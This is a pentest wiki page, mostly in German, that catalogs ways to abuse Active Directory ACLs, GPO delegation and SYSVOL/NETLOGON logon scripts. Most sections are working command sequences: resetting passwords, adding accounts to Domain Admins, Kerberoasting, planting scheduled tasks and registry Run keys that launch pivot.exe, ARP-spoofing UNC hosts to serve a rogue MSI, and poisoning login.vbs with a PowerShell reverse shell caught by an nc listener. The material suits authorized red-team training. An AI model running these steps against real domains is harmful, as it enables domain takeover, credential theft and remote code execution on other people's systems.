# Missbrauch von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Weitere Details finden Sie in den Originalartikeln.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Rechte auf einem Benutzer**

Dieses Privileg gewährt einem Angreifer vollständige Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux können Sie dasselbe über SAMR mit Samba `net rpc` tun:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Wenn das Konto deaktiviert ist, das UAC-Flag löschen**: `GenericAll` ermöglicht die Bearbeitung von `userAccountControl`. Von Linux aus kann BloodyAD das `ACCOUNTDISABLE`-Flag entfernen:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, um es kerberoastbar zu machen, und verwende anschließend Rubeus und targetedKerberoast.py, um die Hashes des Ticket-Granting-Tickets (TGT) zu extrahieren und zu versuchen, sie zu knacken.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktiviere die Pre-Authentication für den Benutzer, wodurch sein Konto für ASREPRoasting anfällig wird.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` für einen Benutzer können Sie ein zertifikatbasiertes Credential hinzufügen und sich als dieser Benutzer authentifizieren, ohne dessen Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für eine Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte für eine Gruppe wie `Domain Admins` besitzt. Nachdem der Distinguished Name der Gruppe mit `Get-NetGroup` identifiziert wurde, kann der Angreifer:

- **Sich selbst zur Gruppe „Domain Admins“ hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Von Linux aus kannst du BloodyAD ebenfalls nutzen, um dich selbst beliebigen Gruppen hinzuzufügen, wenn du über GenericAll/Write-Berechtigungen für diese verfügst. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Das Besitzen dieser Berechtigungen für ein Computerobjekt oder ein Benutzerkonto ermöglicht:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Verwende diese Technik, um dich als Computer- oder Benutzerkonto auszugeben, indem du die Berechtigungen zum Erstellen von Shadow Credentials ausnutzt.

## **WriteProperty on Group**

Wenn ein Benutzer über `WriteProperty`-Rechte für alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) verfügt, kann er:

- **Sich selbst zur Domain-Admins-Gruppe hinzufügen**: Durch die Kombination der Befehle `net user` und `Add-NetGroupUser` möglich, erlaubt diese Methode eine Privilege Escalation innerhalb der Domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Dieses Privileg ermöglicht es Angreifern, sich selbst zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen, und zwar über Befehle, die die Gruppenmitgliedschaft direkt manipulieren. Die folgende Befehlssequenz ermöglicht das Hinzufügen des eigenen Kontos:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ein ähnliches Privileg ermöglicht es Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, sofern sie für diese Gruppen das Recht `WriteProperty` besitzen. Die Bestätigung und Ausführung dieses Privilegs erfolgt mit:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Das Halten des `ExtendedRight` für einen Benutzer bei `User-Force-Change-Password` ermöglicht das Zurücksetzen von Passwörtern, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und seine Ausnutzung können über PowerShell oder alternative command-line tools erfolgen. Dafür stehen mehrere Methoden zum Zurücksetzen des Passworts eines Benutzers zur Verfügung, darunter interaktive Sitzungen und One-Liner für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffsmöglichkeiten.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner für eine Gruppe**

Wenn ein Angreifer feststellt, dass er `WriteOwner`-Berechtigungen für eine Gruppe besitzt, kann er den Besitzer der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung des Besitzers eine umfassendere Kontrolle über Gruppenattribute und -mitgliedschaften ermöglicht. Der Vorgang umfasst die Identifizierung des richtigen Objekts mit `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Besitzer entweder per SID oder Namen zu ändern.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Konkret kann der Angreifer mit `GenericWrite`-Zugriff den Pfad des Anmeldeskripts eines Benutzers ändern, um bei der Benutzeranmeldung ein bösartiges Skript auszuführen. Dies wird erreicht, indem der Angreifer den Befehl `Set-ADObject` verwendet, um die Eigenschaft `scriptpath` des Zielbenutzers so zu aktualisieren, dass sie auf das Skript des Angreifers verweist.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, beispielsweise sich selbst oder andere Benutzer zu bestimmten Gruppen hinzuzufügen. Dieser Prozess umfasst das Erstellen eines Credential-Objekts, dessen Verwendung zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe sowie die Überprüfung der Änderungen an der Gruppenmitgliedschaft mit PowerShell-Befehlen.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Von Linux aus kann Samba `net` Mitglieder hinzufügen/entfernen, wenn du `GenericWrite` für die Gruppe besitzt (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Der Besitz eines AD-Objekts und `WriteDACL`-Berechtigungen darauf ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI manipulation erreicht und ermöglicht die vollständige Kontrolle über das Objekt sowie die Möglichkeit, dessen Gruppenmitgliedschaften zu ändern. Dennoch bestehen Einschränkungen beim Versuch, diese Berechtigungen mithilfe der Cmdlets `Set-Acl` / `Get-Acl` des Active Directory-Moduls auszunutzen.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Schnelle Übernahme mit WriteDACL/WriteOwner (PowerView)

Wenn Sie `WriteOwner` und `WriteDacl` über ein Benutzer- oder Dienstkonto besitzen, können Sie die vollständige Kontrolle übernehmen und dessen Passwort mit PowerView zurücksetzen, ohne das alte Passwort zu kennen:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Hinweise:
- Möglicherweise musst du zuerst den Besitzer auf dich selbst ändern, wenn du nur über `WriteOwner` verfügst:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validieren Sie den Zugriff nach dem Zurücksetzen des Passworts mit einem beliebigen Protokoll (SMB/LDAP/RDP/WinRM).

## **Replikation in der Domäne (DCSync)**

Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domäne, um einen Domain Controller nachzuahmen und Daten einschließlich Benutzeranmeldeinformationen zu synchronisieren. Diese leistungsfähige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, vertrauliche Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller zu benötigen.<sup>[[5]](#references)</sup> [**Hier erfahren Sie mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise ein Benutzer wie `offense\spotless` mit Verwaltungsrechten für GPOs ausgestattet ist, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mithilfe von PowerView identifiziert werden kann: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-Berechtigungen enumerieren

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verkettet werden. Dadurch lassen sich GPOs ermitteln, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf denen eine bestimmte Richtlinie angewendet wird**: Es ist möglich zu ermitteln, auf welche Computer ein bestimmtes GPO angewendet wird, um den Umfang potenzieller Auswirkungen besser zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einem bestimmten Computer angewendete Richtlinien**: Um anzuzeigen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet wird**: Die von einer bestimmten Richtlinie betroffenen Organisationseinheiten (OUs) können mit `Get-DomainOU` identifiziert werden.

Sie können außerdem das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs zu enumerieren und darin enthaltene Probleme zu finden.

### GPO missbrauchen - New-GPOImmediateTask

Fehlerhaft konfigurierte GPOs können zur Codeausführung missbraucht werden, beispielsweise durch das Erstellen einer sofort ausgeführten geplanten Aufgabe. Dadurch kann ein Benutzer zur lokalen Administratorengruppe auf den betroffenen Computern hinzugefügt werden, wodurch die Berechtigungen erheblich erweitert werden:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Das GroupPolicy-Modul ermöglicht, sofern es installiert ist, die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Präferenzen wie Registry-Werten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und sich ein Benutzer am Computer anmeldet, damit die Ausführung erfolgt:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bietet eine Methode, um vorhandene GPOs zu missbrauchen, indem Tasks hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung vorhandener GPOs oder die Verwendung von RSAT-Tools, um vor dem Anwenden der Änderungen neue GPOs zu erstellen:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Richtlinienaktualisierung erzwingen

GPO-Aktualisierungen erfolgen typischerweise etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um sofort eine Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.

### Unter der Haube

Bei der Überprüfung der Scheduled Tasks für ein bestimmtes GPO, beispielsweise `Misconfigured Policy`, kann die Hinzufügung von Tasks wie `evilTask` bestätigt werden. Diese Tasks werden durch Scripts oder Command-Line-Tools erstellt, die das Systemverhalten ändern oder Privilege Escalation ermöglichen sollen.

Die Struktur des Tasks, wie sie in der von `New-GPOImmediateTask` generierten XML-Konfigurationsdatei dargestellt wird, beschreibt die Einzelheiten des Scheduled Tasks - einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden, und bietet eine Methode zur Ausführung beliebiger Befehle oder Scripts als Teil der Richtliniendurchsetzung.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch die direkte Bearbeitung der Users and Groups-Richtliniendateien können Angreifer Benutzer privilegierten Gruppen hinzufügen, beispielsweise der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die das Ändern von Richtliniendateien erlaubt, um neue Benutzer aufzunehmen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Users and Groups beschreibt, wie diese Änderungen implementiert werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern auf den betroffenen Systemen erhöhte Berechtigungen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Privilege Escalation durch GPO-Manipulation.

Darüber hinaus können weitere Methoden zur Codeausführung oder zum Aufrechterhalten von Persistence in Betracht gezogen werden, beispielsweise die Nutzung von Logon-/Logoff-Scripts, das Ändern von Registry Keys für Autoruns, die Installation von Software über `.msi`-Dateien oder das Bearbeiten von Service-Konfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, durch den Missbrauch von GPOs den Zugriff auf Zielsysteme aufrechtzuerhalten und diese zu kontrollieren.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` über eine OU oder Domain ermöglicht es dir, das Attribut `gPLink` des Zielcontainers zu ändern und **die Anwendung eines vorhandenen GPOs zu erzwingen**, ohne das GPO selbst zu bearbeiten. Dies wird interessant, wenn das verknüpfte GPO bereits auf entfernte Inhalte über **UNC paths** (`\\HOST\share\...`) verweist, da authentifizierte Benutzer **SYSVOL** lesen und offline nach wiederverwendbaren Policies suchen können.<sup>[[11]](#references)</sup>

Workflow auf hoher Ebene:

1. Verwende BloodHound, um einen Principal mit `WriteGPLink` über eine OU zu identifizieren, und ermittle Computer und Benutzer innerhalb dieser OU.
2. Klone `SYSVOL` schreibgeschützt und analysiere die GPOs nach **Software Installation**, **drive mappings** (`Drives.xml`) sowie **logon/startup scripts**, die auf UNC paths verweisen.
3. Bevorzuge Policies, die auf einen **direkten Hostnamen** verweisen (beispielsweise `\\DC02\share\pkg.msi`), statt auf DFS-/Domain-Namespace-Pfade, da hostname-basierte Pfade mit L2 spoofing leichter umgeleitet werden können.
4. Füge die GUID des ausgewählten GPOs zur `gPLink` der Ziel-OU hinzu, sodass das Opfer diese bereits vorhandene Policy verarbeitet.
5. Führe in derselben Broadcast-Domain ARP spoofing für den UNC-Host durch und binde seine IP lokal (`ip addr add <target_ip>/32 dev <iface>`), damit der SMB-Traffic des Opfers deinen Host erreicht.
6. Stelle den erwarteten Pfad und Dateinamen über einen SMB-Server des Angreifers bereit (beispielsweise `smbserver.py`) und warte auf die normale Policy-Verarbeitung.

Beispiel für die Erfassung von `SYSVOL` und die GPO-Korrelation:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Verknüpfen Sie das vorhandene GPO mit der Ziel-OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Wenn die verknüpfte GPO ein MSI von einem UNC-Pfad bereitstellt, ruft der Client es während des **Computerstarts** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Durch das Spoofen des referenzierten Hosts und das Bereitstellen eines bösartigen MSI unter **demselben Share/Pfad/Namen** kann `WriteGPLink` in SYSTEM-Codeausführung umgewandelt werden, **ohne SYSVOL zu ändern**.

Wichtige Einschränkungen:

- **Das Timing ist entscheidend**: Der neue Link wird bei der Aktualisierung der Richtlinie erkannt (üblicherweise nach etwa 90 Minuten), aber **Software Installation** wird normalerweise beim **Neustart** ausgelöst.
- Windows Installer verfolgt das Deployment üblicherweise anhand des **`ProductCode`**. Wenn das Produkt bereits installiert ist, wird das Deployment möglicherweise übersprungen.
- Um eine Ablehnung durch den Installer zu vermeiden, muss das Rogue-MSI so angepasst werden, dass sein **`ProductCode`** und **`PackageCode`** mit denen des von der GPO erwarteten legitimen Pakets übereinstimmen.
- Alte `.aas`-Ankündigungsdateien können in `SYSVOL` verbleiben. Überprüfe daher, ob das Deployment weiterhin aktiv aussieht, bevor du dich darauf verlässt.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` cause users to authenticate to the configured UNC path during logon or reconnection. If you spoof the referenced host, you can capture **NetNTLMv2**. If SMB is deliberately made to fail, Windows may retry over **WebDAV**, sending **NTLM over HTTP**, which is far more flexible for relays to **LDAP(S)**, **AD CS** or **SMB**.

#### Logon/startup script UNC hijack

The same pattern applies to UNC-hosted scripts discovered in `SYSVOL`:

- **Logon scripts** werden normalerweise im Kontext des **users** ausgeführt.
- **Startup scripts** werden normalerweise im Kontext des **computers / SYSTEM** ausgeführt.

If the script path points to a spoofable hostname, redirect the UNC host and serve replacement script content from the expected location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Logon scripts lokalisieren
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Durchsuche Domänenfreigaben, um Verknüpfungen oder Verweise auf Skripte aufzuspüren:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parse `.lnk`-Dateien, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick und für Angreifer ohne direkten GPO-Zugriff):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound zeigt das Attribut `logonScript` (`scriptPath`) auf Benutzerknoten an, sofern es vorhanden ist.

### Schreibzugriff überprüfen (Share-Auflistungen nicht vertrauen)
Automatisierte Tools können SYSVOL/NETLOGON als schreibgeschützt anzeigen, aber die zugrunde liegenden NTFS-ACLs können dennoch Schreibzugriffe erlauben. Immer testen:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Wenn sich die Dateigröße oder die mtime ändert, hast du Schreibrechte. Sichere die Originaldateien, bevor du sie änderst.

### Einen VBScript-Logon-Script für RCE vergiften
Füge einen Befehl hinzu, der eine PowerShell reverse shell startet (generiere sie über revshells.com), und behalte die ursprüngliche Logik bei, um die Geschäftsfunktion nicht zu beeinträchtigen:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Lausche auf deinem Host und warte auf die nächste interaktive Anmeldung:
```bash
rlwrap -cAr nc -lnvp 443
```
Hinweise:
- Die Ausführung erfolgt unter dem Token des protokollierenden Benutzers (nicht SYSTEM). Der Geltungsbereich entspricht der GPO-Verknüpfung (OU, Standort, Domäne), auf die dieses Skript angewendet wird.
- Nach der Verwendung sollten der ursprüngliche Inhalt und die Zeitstempel wiederhergestellt werden.


## Referenzen

- [1] [Abusing Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts and Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – The ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
